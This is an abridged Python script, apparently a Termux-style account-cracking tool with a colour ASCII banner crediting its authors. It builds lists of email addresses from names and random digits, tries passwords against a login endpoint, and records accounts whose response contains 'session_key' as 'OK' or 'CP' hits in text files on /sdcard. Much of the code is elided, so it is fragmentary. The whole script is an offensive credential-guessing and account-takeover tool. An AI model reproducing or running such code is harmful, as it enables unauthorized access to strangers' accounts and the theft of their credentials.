...
{G}     db                                               
{R}    ;MM:                                              
{Y}   ,V^MM.    `7Mb,od8 `7M'   `MF' ,6"Yb.  `7MMpMMMb.  
{S}  ,M  `MM      MM' "'   VA   ,V  8)   MM    MM    MM  
{uu}  AbmmmqMA     MM        VA ,V    ,pm9MM    MM    MM  
{S}  A'     VML    MM         VVV    8M   MM    MM    MM  
{R}.AMA.   .AMMA..JMML.       ,V     `Moo9^Yo..JMML  JMML.
                          ,V                           
                       OOb"                            
\033[1;93m=================================
\033[1;97m Owner  : Aaryan x Fariya :/
\033[1;97m GitHub : Aaryan-404 :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Aaryan-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Aaryan-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Aaryan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Aaryan')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Aaryan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Aaryan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Aaryan', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Aaryan-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mAaryan-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Aaryan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mAaryan-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Aaryan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
